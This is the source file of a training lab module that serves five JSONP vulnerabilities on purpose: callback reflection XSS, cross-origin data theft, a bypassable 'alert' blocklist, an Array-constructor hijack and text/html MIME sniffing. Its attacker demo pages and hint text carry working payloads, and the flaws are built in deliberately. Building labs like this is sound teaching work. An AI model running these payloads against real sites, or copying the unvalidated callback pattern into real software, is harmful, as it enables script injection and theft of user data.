// PenTrix VulnLab module: JSONP Injection (jsonp)
// Five labs on the JSONP pattern: callback reflection, cross-origin data theft,
// naive callback blocklists, the classic Array-constructor hijack, and
// dangerous MIME types.
const express = require('express');
const crypto = require('crypto');
const { getDb } = require('../../lib/db');
const { brief, esc, fixPanel, flagBox, hintBox, hintLadder, page, toolsPill, trackBanner } = require('../../lib/page');
const { award, captured } = require('../../lib/flags');

const router = express.Router();
// Router-scoped form parsing only (app-level middleware is out of scope).
router.use(express.urlencoded({ extended: false }));

const FRIENDS = ['alice:A1', 'bob:B2', 'carol:C3'];

// ---------------------------------------------------------------------------
// Verification model.
// - The three reflection labs (callback-xss, filter-bypass, mimetype) no
//   longer award on input patterns. Each JSONP endpoint embeds a per-session,
//   per-vuln nonce in its response data; the injected script must echo the
//   nonce back to /jsonp/beacon-xss, proving it really executed with the
//   response data (or that the endpoint was at least hit in this session).
//   Nonces are single-use.
// - csrf-data and array-hijack beacons are bound to per-session secrets
//   issued by /jsonp/data and /jsonp/legacy, so a forged beacon with no feed
//   load earns nothing.
// ---------------------------------------------------------------------------
function jsonpNonce(req, v) {
  if (!req.session.jsonpNonce) req.session.jsonpNonce = {};
  // hasOwnProperty: never trust a plain truthiness check on a keyed map.
  if (!Object.prototype.hasOwnProperty.call(req.session.jsonpNonce, v)) {
    req.session.jsonpNonce[v] = crypto.randomBytes(16).toString('hex');
  }
  return req.session.jsonpNonce[v];
}
function jsonpConsumeNonce(req, v, n) {
  const m = req.session.jsonpNonce;
  const cur = m && Object.prototype.hasOwnProperty.call(m, v) ? m[v] : null;
  const ok = !!cur && cur === n && n.length > 0;
  if (ok) delete m[v]; // single-use
  return ok;
}
// Per-session secret stolen via the JSONP feed (was a module constant: anyone
// reading source knew it without a single request).
function jsonpSecret(req) {
  if (!req.session.jsonpSecret) req.session.jsonpSecret = crypto.randomBytes(16).toString('hex');
  return req.session.jsonpSecret;
}
// Per-session token appended to the legacy Array feed; the hijack beacon must
// carry it back, proving the feed was actually loaded.
function jsonpArrayToken(req) {
  if (!req.session.jsonpArrayToken) req.session.jsonpArrayToken = crypto.randomBytes(16).toString('hex');
  return req.session.jsonpArrayToken;
}
// Beacon for the three reflection labs: the executed payload echoes the nonce.
router.get('/beacon-xss', (req, res) => {
  const v = String(req.query.v || '');
  const n = String(req.query.n || '');
  const ids = ['callback-xss', 'filter-bypass', 'mimetype'];
  let ok = ids.includes(v) && jsonpConsumeNonce(req, v, n);
  // The filter-bypass and mimetype labs teach a specific payload shape; the
  // endpoint records the attempt, the nonce echo proves it executed.
  if (ok && v === 'filter-bypass') ok = req.session.jsonpFbAttempt === true;
  if (ok && v === 'mimetype') ok = req.session.jsonpMimeAttempt === true;
  if (ok) {
    const flag = award(req, 'jsonp', v);
    return res.send(page('Payload executed', `
      <h2>Payload executed</h2>
      <p>The injected script ran with the JSONP response data and echoed the
      page-bound token back for vuln <b>${esc(v)}</b>. Flag awarded:</p>
      ${flagBox(flag)}
      <p><a href="/jsonp">Back to the JSONP module</a></p>
    `));
  }
  res.status(400).send(page('Beacon', `
    <h2>No flag</h2>
    <p>This endpoint only awards a flag when the injected script really executed:
    the beacon must echo the per-session token (<code>n</code>) that the JSONP
    endpoint embedded in its response data. Load the JSONP URL as a script and
    let your payload fire the beacon.</p>
    <p><a href="/jsonp">Back to the JSONP module</a></p>
  `));
});

// ---------------------------------------------------------------- index page
const CHALLENGES = [
  ['user', 'callback-xss'],
  ['attacker', 'csrf-data'],
  ['filtered', 'filter-bypass'],
  ['array-attacker', 'array-hijack'],
  ['snippet', 'mimetype'],
];

router.get('/', (req, res) => {
  const vulns = module.exports.vulns;
  const rows = vulns.map((v) => {
    const ch = CHALLENGES.find((c) => c[1] === v.id);
    const done = captured(req, 'jsonp', v.id);
    return `
      <div class="vuln-card">
        <h3><a href="/jsonp/${ch[0]}">${esc(v.name)}</a>
          <span class="diff">${esc(v.difficulty)}</span>
          ${done ? '<span class="captured">flag captured</span>' : ''}
        </h3>
        ${hintLadder(v)}
      ${toolsPill(v)}
        <p><i>Attack:</i> ${esc(v.how)}</p>
      </div>`;
  }).join('\n');

  res.send(page('JSONP Injection', `
    ${brief('Module briefing', `
      <p><b>What is JSONP?</b> Before CORS, sites shared data cross-origin with
      "JSON with padding": the server wraps JSON in a caller-chosen JavaScript
      function, e.g. <code>callback({"user":"alice"})</code>, and any page loads
      it with a <code>&lt;script&gt;</code> tag. Classic <code>script</code> tags
      are exempt from the Same-Origin Policy, so <b>any site can read JSONP</b>.</p>
      <p><b>The goals here:</b> break out of the callback into executable
      JavaScript, steal JSONP data cross-origin via an attacker page, bypass a
      naive callback blocklist, replay the historic Array-constructor hijack, and
      abuse a <code>text/html</code> MIME type.</p>
      <p><b>Heads up:</b> the reflection labs embed a per-session token in the JSONP
      response data. Your injected script must echo that token back to
      <code>/jsonp/beacon-xss</code> - that beacon is what captures the flag, and it
      only fires when your payload really executed. Merely sending a suspicious
      callback earns nothing.</p>`)}
    ${trackBanner(module.exports)}
    <h2>Challenges</h2>
    ${rows}
  `));
});

// ------------------------------------------------- v1: callback XSS
router.get('/user', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  res.type('application/javascript');
  // VULN: the callback name is reflected into executable JavaScript with no
  // validation, so it can break out of the function-call context.
  // The response embeds a per-session token in the data object; the injected
  // script must echo it back to /jsonp/beacon-xss. The old input-pattern award
  // (any non-word character in the callback) is gone: no execution, no flag.
  const body = `${cb}({"user":"alice","role":"user","token":"${jsonpNonce(req, 'callback-xss')}"});`;
  res.send(body);
});

// --------------------------------------- v2: JSONP cross-origin data theft
router.get('/data', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  res.type('application/javascript');
  // VULN: sensitive data is served as JSONP, readable cross-origin by any
  // page via a script tag. The secret is per-session: the beacon only accepts
  // the secret this session's feed actually served.
  res.send(`${cb}({"user":"alice","email":"alice@example.com","secret":"${jsonpSecret(req)}"});`);
});

router.get('/attacker', (req, res) => {
  const done = captured(req, 'jsonp', 'csrf-data');
  res.send(page('Attacker page', `
    <h2>Attacker page (JSONP theft demo)</h2>
    <p>This page plays the role of <code>evil.example</code>. When it loads, it
    pulls the victim's JSONP feed with a plain <code>&lt;script&gt;</code> tag
    (the Same-Origin Policy does not apply to classic scripts) and beacons the
    data to <code>/jsonp/beacon</code>.</p>
    <pre><code>${esc('<script src="/jsonp/data?callback=steal"></script>')}</code></pre>
    <p id="status">Waiting for the JSONP response...</p>
    <script>
      function steal(d) {
        document.getElementById('status').textContent =
          'Got data for ' + d.user + '; beaconing it to /jsonp/beacon ...';
        fetch('/jsonp/beacon', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(d)
        }).then(function (r) { return r.json(); }).then(function (j) {
          document.getElementById('status').innerHTML = j.ok
            ? 'Beacon accepted. Flag: <code>' + j.flag + '</code> (saved to your scoreboard)'
            : 'Beacon rejected: ' + (j.error || 'unknown');
        });
      }
    </script>
    <script src="/jsonp/data?callback=steal"></script>
    ${done ? '<p><b>Flag captured.</b> Check your scoreboard.</p>' : ''}
    <p class="note">The theft happens automatically when this page loads: the
    victim only has to visit the attacker's link while logged in.</p>
    <p><a href="/jsonp">Module index</a></p>
  `));
});

router.post('/beacon', (req, res) => {
  const b = req.body || {};
  // The beacon must carry the secret this session's feed served: proof the
  // feed was actually loaded. Single-use: the secret rotates after the award.
  if (b.secret && req.session.jsonpSecret && b.secret === req.session.jsonpSecret) {
    const flag = award(req, 'jsonp', 'csrf-data');
    delete req.session.jsonpSecret;
    return res.json({ ok: true, flag });
  }
  res.status(400).json({ ok: false, error: 'beacon must carry the stolen secret field' });
});

// -------------------------------------------- v3: callback filter bypass
router.get('/filtered', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  if (/alert/i.test(cb)) {
    return res.status(400).send(page('Blocked', `
      <h2>Callback blocked</h2>
      <p>The word "alert" is not allowed in callback names.</p>
      <p class="note">Blocklists fail when the dangerous string can be rebuilt
      at runtime. JavaScript string concatenation still works inside a callback.</p>
      <p><a href="/jsonp">Module index</a></p>
    `));
  }
  res.type('application/javascript');
  // VULN: the blocklist only bans the literal word "alert"; concatenation like
  // 'al'+'ert' rebuilds it at runtime and the filter never sees it.
  // The response embeds a per-session token; the injected script must echo it
  // back to /jsonp/beacon-xss. The old input-pattern award is gone: the attempt
  // shape is recorded here, but only an executed beacon earns the flag.
  if (/['"]\s*\+/.test(cb) && /[();]/.test(cb)) req.session.jsonpFbAttempt = true;
  const body = `${cb}({"ok":true,"token":"${jsonpNonce(req, 'filter-bypass')}"});`;
  res.send(body);
});

// --------------------------------------- v4: Array constructor hijack
router.get('/legacy', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  res.type('application/javascript');
  // VULN: this legacy endpoint builds its JSONP with `new Array(...)`. An
  // attacker page that overrides the global Array constructor before loading
  // this script captures every array element (the classic 2007 hijack).
  // The feed appends a per-session token: the hijack beacon must carry it back,
  // proving the feed was actually loaded and hijacked in this session.
  const items = FRIENDS.concat(['feed-token:' + jsonpArrayToken(req)]);
  res.send(`${cb}(new Array(${items.map((f) => JSON.stringify(f)).join(',')}));`);
});

router.get('/array-attacker', (req, res) => {
  const done = captured(req, 'jsonp', 'array-hijack');
  res.send(page('Array hijack demo', `
    <h2>Attacker page (Array hijack demo)</h2>
    <p>The classic 2007 attack: this page redefines the global
    <code>Array</code> constructor <b>before</b> loading the victim's JSONP.
    Because <code>/jsonp/legacy</code> emits <code>new Array(...)</code>, the
    overridden constructor runs and captures every element, then beacons them to
    <code>/jsonp/array-beacon</code>.</p>
    <p id="status">Overriding Array and loading the JSONP feed...</p>
    <script>
      // Capture the real Array BEFORE overriding: a function *declaration*
      // named Array would hoist and shadow it, so capture first, then assign.
      var RealArray = Array;
      var realSlice = RealArray.prototype.slice;
      var stolen = null;
      Array = function () { stolen = realSlice.call(arguments); };
      function gotFriends() {
        document.getElementById('status').textContent =
          'Hijacked ' + (stolen ? stolen.length : 0) + ' elements; beaconing...';
        fetch('/jsonp/array-beacon', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ items: stolen })
        }).then(function (r) { return r.json(); }).then(function (j) {
          document.getElementById('status').innerHTML = j.ok
            ? 'Beacon accepted. Flag: <code>' + j.flag + '</code> (saved to your scoreboard)'
            : 'Beacon rejected: ' + (j.error || 'unknown');
        });
      }
    </script>
    <script src="/jsonp/legacy?callback=gotFriends"></script>
    ${done ? '<p><b>Flag captured.</b> Check your scoreboard.</p>' : ''}
    <p class="note">Array literals (<code>[...]</code>) do not call the
    constructor in modern engines; this works here only because the legacy
    endpoint emits <code>new Array(...)</code>. That is exactly why emitting
    <code>new Array</code> in JSONP was dangerous.</p>
    <p><a href="/jsonp">Module index</a></p>
  `));
});

router.post('/array-beacon', (req, res) => {
  const items = (req.body || {}).items;
  // The beacon must carry the per-session feed token: proof the legacy feed was
  // loaded and its Array hijacked in this session. Single-use: token rotates.
  const tok = req.session.jsonpArrayToken;
  if (Array.isArray(items) && tok && items.includes('alice:A1') && items.includes('feed-token:' + tok)) {
    const flag = award(req, 'jsonp', 'array-hijack');
    delete req.session.jsonpArrayToken;
    return res.json({ ok: true, flag });
  }
  res.status(400).json({ ok: false, error: 'beacon must carry the hijacked items array' });
});

// --------------------------------------------------- v5: JSONP as text/html
router.get('/snippet', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 300);
  // VULN: JSONP served as text/html is parsed as a document, so HTML/JS in the
  // callback executes on direct visit or inside an iframe.
  res.set('Content-Type', 'text/html; charset=utf-8');
  // The old input-pattern award (any '<' in the callback) is gone: the attempt
  // shape is recorded here, but only an executed script echoing the token back
  // to /jsonp/beacon-xss earns the flag.
  if (/</.test(cb)) req.session.jsonpMimeAttempt = true;
  const body = `${cb}({"note":"hello","token":"${jsonpNonce(req, 'mimetype')}"});`;
  res.send(body);
});

module.exports = {
  id: 'jsonp',
  name: 'JSONP Injection',
  tagline: 'Callback reflection, cross-origin theft, and MIME trickery.',
  description: 'Five flaws in the JSONP pattern: unvalidated callback reflection, sensitive data readable cross-origin via script tags, a naive "alert" blocklist, the historic Array-constructor hijack against a legacy endpoint, and JSONP served with a text/html MIME type.',
  difficulty: 'Intermediate',
  track: 'Advanced',
  prerequisites: ['xss', 'cors'],
  vulns: [
    {
      id: 'callback-xss',
      name: 'Callback XSS',
      difficulty: 'Easy',
      hint: 'The callback parameter is dropped straight into executable JavaScript. It does not have to stay a function name. The response data carries a per-session token your payload must echo back to /jsonp/beacon-xss.',
      hints: ["The callback parameter is reflected into JavaScript. What if it's not a function name?", "Break out: callback=x);alert(1);// turns the response into your code.", "The injected script must echo the per-session token to the beacon."],
      tools: "B",
      how: 'Load /jsonp/user?callback=... as a script with a breakout payload that reads the token from the data object and beacons it, e.g. callback=(d=>fetch(\'/jsonp/beacon-xss?v=callback-xss&n=\'+d.token)).',
    },
    {
      id: 'csrf-data',
      name: 'JSONP Data Theft',
      difficulty: 'Medium',
      hint: 'Classic script tags ignore the Same-Origin Policy. Open the attacker page and watch it steal the feed.',
      hints: ["JSONP is cross-origin by design. The feed has a per-session secret.", "Include the feed via <script> on your attacker page. The callback gets the secret.", "Beacon the secret to prove the cross-origin read."],
      tools: "B, DT",
      how: 'Visit /jsonp/attacker so its script tag pulls /jsonp/data and beacons the secret to /jsonp/beacon.',
    },
    {
      id: 'filter-bypass',
      name: 'Callback Filter Bypass',
      difficulty: 'Medium',
      hint: 'Only the literal word "alert" is blocked. JavaScript can build strings at runtime. Your payload must also echo the per-session token from the response data back to /jsonp/beacon-xss.',
      hints: ["The filter blocks 'alert'. But strings can be concatenated.", "'al'+'ert' is alert without typing it.", "Use the concatenation in the callback to beat the filter and echo the token."],
      tools: "B",
      how: 'Beat the filter with concatenation and beacon the token, e.g. callback=(d=>top[\'fe\'+\'tch\'](\'/jsonp/beacon-xss?v=filter-bypass&n=\'+d.token))// loaded as a script.',
    },
    {
      id: 'array-hijack',
      name: 'Array Constructor Hijack',
      difficulty: 'Hard',
      hint: 'The legacy endpoint emits new Array(...). Override the global Array constructor before the JSONP loads.',
      hints: ["The feed is a JavaScript array. What if Array is redefined?", "Redefine Array before loading the feed. The constructor captures the elements.", "Hijack Array, load the feed, beacon the captured items including the token."],
      tools: "B, DT",
      how: 'Visit /jsonp/array-attacker: it redefines Array, loads the feed, and beacons the captured elements.',
    },
    {
      id: 'mimetype',
      name: 'JSONP MIME Sniffing',
      difficulty: 'Easy',
      hint: 'The response is served as text/html, so the browser parses it as a document, not just script. Your injected markup must read the per-session token from the response text and beacon it to /jsonp/beacon-xss.',
      hints: ["The JSONP is served as text/html. What does the browser do with it?", "It parses as a document. Your callback becomes HTML/JS.", "Request with an HTML-shaped callback and echo the token."],
      tools: "B",
      how: 'Put an HTML tag in the callback and open the URL directly, e.g. <img src=x onerror="fetch(\'/jsonp/beacon-xss?v=mimetype&n=\'+document.body.innerHTML.match(/\\"token\\":\\"([a-f0-9]+)\\"/)[1])">.',
    },
  ],
  router,
};
